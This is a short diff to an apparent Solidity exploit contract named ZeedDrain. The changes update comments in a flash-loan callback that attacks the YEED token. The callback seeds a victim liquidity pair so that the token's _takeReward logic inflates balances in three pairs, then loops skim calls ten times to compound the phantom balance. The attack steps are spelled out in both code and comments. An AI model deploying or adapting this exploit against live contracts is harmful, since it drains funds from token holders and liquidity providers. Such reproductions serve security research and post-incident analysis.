@@ -66,13 +66,14 @@ contract ZeedDrain {
     }
 
     function pancakeCall(address, uint256, uint256 amount1, bytes calldata) public {
-        // 1. Seed the victim pair — a sell-into-pair, so _takeReward fires and
-        //    inflates all three dividend pairs with phantom YEED balance.
+        // VULNERABILITY: (see YEED.sol _takeReward) + EXPLOIT STEPS executed here:
+        // 1. Seed the victim pair — a sell-into-pair (usdtYeedPair is _isSwapPair), so _transferSell + _takeReward fires and
+        //    inflates all three dividend pairs with phantom YEED balance (full rewardFee added to each _balances[pair]).
         yeed.transfer(address(usdtYeedPair), amount1);
 
         // 2. 10-iteration round-robin skim loop. Each skim moves the YEED
         //    surplus from one pair to the next; because the destination is a
-        //    registered pair, the YEED transfer re-fires _takeReward and
+        //    registered _isSwapPair, the YEED transfer re-fires _takeReward and
         //    re-inflates all three pairs. Compounding phantom balance.
         for (uint256 i = 0; i < 10; i++) {
             usdtYeedPair.skim(address(hoYeedPair));
